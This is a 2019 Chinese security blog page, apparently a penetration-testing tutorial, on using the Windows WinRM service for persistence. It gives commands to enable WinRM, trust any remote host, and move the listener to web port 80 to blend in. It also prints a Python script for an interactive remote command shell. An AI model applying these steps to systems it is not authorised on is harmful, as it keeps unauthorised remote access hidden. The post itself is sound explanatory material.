@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="WinRM 是 Microsoft 对 WS-Management 协议的实现,WS-Management 协议即一种基于标准简单对象访问协议[SOAP]的 “防火墙友好” 协议,它让来自不同供应商的硬件和操作系统能够互相操作 Winrm服务http默认启动监听5985，https端口则5986，系统默认是没有启动服务，winrm quickconfig -q 在命令行下开启服务，防火墙会自动添加">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于winrm服务进行常规win权限维持">
+<meta property="og:url" content="http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/index.html">
+<meta property="og:site_name" content="c1y2m3’blog">
+<meta property="og:description" content="WinRM 是 Microsoft 对 WS-Management 协议的实现,WS-Management 协议即一种基于标准简单对象访问协议[SOAP]的 “防火墙友好” 协议,它让来自不同供应商的硬件和操作系统能够互相操作 Winrm服务http默认启动监听5985，https端口则5986，系统默认是没有启动服务，winrm quickconfig -q 在命令行下开启服务，防火墙会自动添加">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d67ee976d67ff2f2810e2b8">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d67eebe32f2ca3c658e7f6d">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d67eeeaa372594312c0dca6">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5d67ef386d67ff2f2810e306">
+<meta property="og:updated_time" content="2019-08-29T15:35:50.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="基于winrm服务进行常规win权限维持">
+<meta name="twitter:description" content="WinRM 是 Microsoft 对 WS-Management 协议的实现,WS-Management 协议即一种基于标准简单对象访问协议[SOAP]的 “防火墙友好” 协议,它让来自不同供应商的硬件和操作系统能够互相操作 Winrm服务http默认启动监听5985，https端口则5986，系统默认是没有启动服务，winrm quickconfig -q 在命令行下开启服务，防火墙会自动添加">
+<meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5d67ee976d67ff2f2810e2b8">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/c1y2m3.github.io/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/c1y2m3.github.io/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/c1y2m3.github.io/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>基于winrm服务进行常规win权限维持</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/c1y2m3.github.io/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">主页</a></li>
+         
+          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/c1y2m3.github.io/2019/08/10/mssql/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/&text=基于winrm服务进行常规win权限维持"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/&title=基于winrm服务进行常规win权限维持"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/&is_video=false&description=基于winrm服务进行常规win权限维持"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=基于winrm服务进行常规win权限维持&body=Check out this article: http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/&title=基于winrm服务进行常规win权限维持"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/&title=基于winrm服务进行常规win权限维持"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/&title=基于winrm服务进行常规win权限维持"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/&title=基于winrm服务进行常规win权限维持"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/&name=基于winrm服务进行常规win权限维持&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        基于winrm服务进行常规win权限维持
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">c1y2m3’blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-08-29T15:35:00.000Z" itemprop="datePublished">2019-08-29</time>
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>WinRM 是 Microsoft 对 WS-Management 协议的实现,WS-Management 协议即一种基于标准简单对象访问协议[SOAP]的 “防火墙友好” 协议,它让来自不同供应商的硬件和操作系统能够互相操作</p>
+<p>Winrm服务http默认启动监听5985，https端口则5986，系统默认是没有启动服务，<br>winrm quickconfig -q 在命令行下开启服务，防火墙会自动添加例外规则。</p>
+<p>默认客户端连接则会提示Winrs error:WinRM 客户端无法处理该请求。如果身份验证方案与 Kerberos 不同，或者客户端计算机…,则需在客户端添加一个TrustedHost表，*代表信任远程任意主机。</p>
+<p>Set-Item WSMan:localhost\client\trustedhosts -value *  </p>
+<p>windows内置winrs命令行操作 ,则弹回个半交互cmd shell，</p>
+<p>winrs -r:<a href="http://192.168.1.232:5985/wsman" target="_blank" rel="noopener">http://192.168.1.232:5985/wsman</a> -u:administrator -p:XXXX cmd</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5d67ee976d67ff2f2810e2b8" alt=""></p>
+<p>Winrm服务底层通讯协议使用的是http,且会在http.sys上注册wsman前缀，HTTP.sys驱动中有个功能，只需要注册各自不同的url前缀即可实现端口共享。如该机器存在web服务端口，则可以利用修改winrm端口来实现权限维持。</p>
+<p>winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port=”80”}</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5d67eebe32f2ca3c658e7f6d" alt=""></p>
+<p>可以看到原winrm服务端口5985已关闭，通过web服务端口连接到windows服务器。</p>
+<p><img src="https://www.yunzhijia.com/microblog/filesvr/5d67eeeaa372594312c0dca6" alt=""><br>测试代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line">import winrm as pywinrm</span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parse = argparse.ArgumentParser(description=&quot;WinRM Shell&quot;)</span><br><span class="line">parse.add_argument(&apos;-H&apos;, &apos;--hostname&apos;, type=str, help=&quot;RHOST&quot;)</span><br><span class="line">parse.add_argument(&apos;-u&apos;, &apos;--username&apos;, type=str, help=&quot;USERNAME&quot;)</span><br><span class="line">parse.add_argument(&apos;-p&apos;, &apos;--password&apos;, type=str, help=&quot;PASSWORD&quot;,)</span><br><span class="line">parse.add_argument(&apos;-d&apos;, &apos;--domain&apos;, type=str, help=&quot;domain&quot;,)</span><br><span class="line">args = parse.parse_args()</span><br><span class="line"></span><br><span class="line">class Credentials:</span><br><span class="line">    def __init__(self, username, password, domain):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line">        self.domain = domain</span><br><span class="line">        if self.domain is None:</span><br><span class="line">            self.domain = &apos;WORKGROUP&apos;</span><br><span class="line"></span><br><span class="line">class Connection:</span><br><span class="line">    def __init__(self, hostname, credentials):</span><br><span class="line">        self.hostname = hostname</span><br><span class="line">        self.username = credentials.username</span><br><span class="line">        self.password = credentials.password</span><br><span class="line">        self.domain = credentials.domain</span><br><span class="line"></span><br><span class="line">    def session(self, args):</span><br><span class="line">        conn = pywinrm.Session(</span><br><span class="line">            self.hostname,</span><br><span class="line">            auth=(</span><br><span class="line">                &apos;&#123;&#125;\\&#123;&#125;&apos;.format(</span><br><span class="line">                    self.domain,</span><br><span class="line">                    self.username),</span><br><span class="line">                self.password),</span><br><span class="line">            transport=&apos;ntlm&apos;,</span><br><span class="line">            server_cert_validation=&apos;ignore&apos;)</span><br><span class="line">        try:</span><br><span class="line">            r = conn.run_cmd(args)</span><br><span class="line">            return (r.std_out).strip(&quot;\n&quot;)</span><br><span class="line">        except Exception :</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">hostname = args.hostname</span><br><span class="line">username = args.username</span><br><span class="line">password = args.password</span><br><span class="line">domain = args.domain</span><br><span class="line"></span><br><span class="line">if not args.hostname:</span><br><span class="line">    parse.print_help()</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">print(&apos;Connecting to: &apos; + (hostname))</span><br><span class="line">print(r&apos;Using credentials: %s\%s:%s&apos; % ((domain), (username), (password)))</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    credentials = Credentials(username, password, domain)</span><br><span class="line">    connection = Connection(hostname, credentials)</span><br><span class="line">    current =connection.session(&quot;whoami&quot;)</span><br><span class="line">    print(&apos;Current User: &apos; + current)</span><br><span class="line">    while True:</span><br><span class="line">        command = raw_input(&quot;cmd&gt; &quot;)</span><br><span class="line">        if command == &apos;exit&apos;:</span><br><span class="line">            exit()</span><br><span class="line">        print connection.session(command)</span><br><span class="line">except KeyboardInterrupt:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>
+<p>最终实现效果：<br><img src="https://www.yunzhijia.com/microblog/filesvr/5d67ef386d67ff2f2810e306" alt=""></p>
+<p>参考链接：<br><a href="https://paper.seebug.org/1004/" target="_blank" rel="noopener">https://paper.seebug.org/1004/</a><br><a href="https://mp.weixin.qq.com/s/8M_KRtuaXx-rFpok_wyYfQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/8M_KRtuaXx-rFpok_wyYfQ</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">主页</a></li>
+         
+          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/&text=基于winrm服务进行常规win权限维持"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/&title=基于winrm服务进行常规win权限维持"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/&is_video=false&description=基于winrm服务进行常规win权限维持"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=基于winrm服务进行常规win权限维持&body=Check out this article: http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/&title=基于winrm服务进行常规win权限维持"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/&title=基于winrm服务进行常规win权限维持"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/&title=基于winrm服务进行常规win权限维持"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/&title=基于winrm服务进行常规win权限维持"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/08/29/基于winrm服务进行权限维持/&name=基于winrm服务进行常规win权限维持&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">主页</a></li>
+         
+          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/c1y2m3.github.io/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/c1y2m3.github.io/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/c1y2m3.github.io/lib/jquery/jquery.min.js"></script>
+<script src="/c1y2m3.github.io/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/c1y2m3.github.io/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
